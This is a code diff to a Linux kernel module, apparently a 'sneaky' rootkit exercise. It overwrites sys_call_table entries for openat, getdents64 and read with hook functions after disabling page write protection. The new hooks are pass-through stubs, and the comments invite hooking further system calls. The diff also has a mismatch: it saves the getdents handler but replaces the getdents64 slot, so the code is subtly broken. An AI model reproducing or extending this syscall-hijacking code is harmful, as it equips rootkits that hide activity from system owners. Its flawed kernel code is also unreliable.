@@ -32,7 +32,7 @@ int disable_page_rw(void *ptr){
   pte->pte = pte->pte &~_PAGE_RW;
   return 0;
 }
-
+//-----------------------openat Function--------------------------------------------
 // 1. Function pointer will be used to save address of the original 'openat' syscall.
 // 2. The asmlinkage keyword is a GCC #define that indicates this function
 //    should expect it find its arguments on the stack (not in registers).
@@ -64,6 +64,20 @@ asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
   return (*original_openat)(regs);
 }
 
+//-----------------------getdents64 Function--------------------------------------------
+asmlinkage int (*original_getdents64)(struct pt_regs *);
+
+asmlinkage int sneaky_sys_getdents64(struct pt_regs *regs) {
+  return (*original_getdents64)(regs);
+}
+
+//-----------------------read Function--------------------------------------------
+asmlinkage int (*original_read)(struct pt_regs *);
+
+asmlinkage int sneaky_sys_read(struct pt_regs *regs) {
+  return (*original_read)(regs);
+}
+
 // The code that gets executed when the module is loaded
 static int initialize_sneaky_module(void)
 {
@@ -78,11 +92,15 @@ static int initialize_sneaky_module(void)
   // function address. Then overwrite its address in the system call
   // table with the function address of our new code.
   original_openat = (void *)sys_call_table[__NR_openat];
+  original_getdents64 = (void *)sys_call_table[__NR_getdents];
+  original_read = (void *)sys_call_table[__NR_read];
   
   // Turn off write protection mode for sys_call_table
   enable_page_rw((void *)sys_call_table);
   
   sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
+  sys_call_table[__NR_getdents64] = (unsigned long)sneaky_sys_getdents64;
+  sys_call_table[__NR_read] = (unsigned long)sneaky_sys_read;
 
   // You need to replace other system calls you need to hack here
   
